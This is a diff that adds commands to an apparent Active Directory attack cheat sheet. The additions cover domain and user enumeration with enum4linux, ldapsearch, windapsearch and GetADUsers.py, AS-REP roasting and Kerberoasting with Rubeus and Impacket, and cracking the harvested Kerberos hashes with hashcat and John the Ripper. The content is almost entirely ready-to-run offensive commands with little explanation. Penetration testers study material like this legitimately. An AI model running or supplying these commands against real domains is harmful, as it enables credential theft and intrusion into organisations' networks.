@@ -95,6 +95,16 @@ Invoke-ShareFinder  //Enum smb shares
 
 Get-NetGPO  //Enum Group Policies...Filter it using select
 
+enum4linux -a <IP>
+
+ldapsearch -h <domain name> -p 389 -x -b <"dc=domain,dc=local"> 
+
+python windapsearch.py -d <domain name> -U
+
+GetADUsers.py -all <domain>/
+
+GetADUsers.py -all <domain\User> -dc-ip <DC_IP> // If you have a valid user
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 // Domain mapping in graphical format using BloodHound
@@ -206,6 +216,24 @@ sekurlsa::tickets // Retrieval of TGS and TGT
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+// ASEP-Roasting
+// An attack against kerberos for users that do not require pre-authentication. This would help us in retrieving the password hashes of users.
+
+.\Rubeus.exe asreproast
+
+// Impacket
+// check ASREPROast for all domain users (credentials required)
+python GetNPUsers.py /: -request -format -outputfile
+
+// check ASREPRoast for a list of users (no credentials required)
+python GetNPUsers.py / -userfile -format -outputfile
+
+// Cracking Hashes
+hashcat -m 18200 -a 0  
+john --wordlist= 
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 // Kerberosting....Attacking Service Tickets of SPNs
 
 // SPN Enumeration
@@ -222,6 +250,14 @@ GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP Address of Domain Contr
 
 get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}  // Powershell Inbuilt
 
+
+// using Rubeus
+.\Rubeus.exe kerberoast /outfile:file.hash
+.\Rubeus.exe kerberoast /creduser:domain.fqdn\user /credpassword:password /outfile:file.hash
+
+//Cracking Hashes
+hashcat -m 13100 --force  
+john --format=krb5tgs --wordlist= 
 
 // Request service tickets from AD using SPN values
 
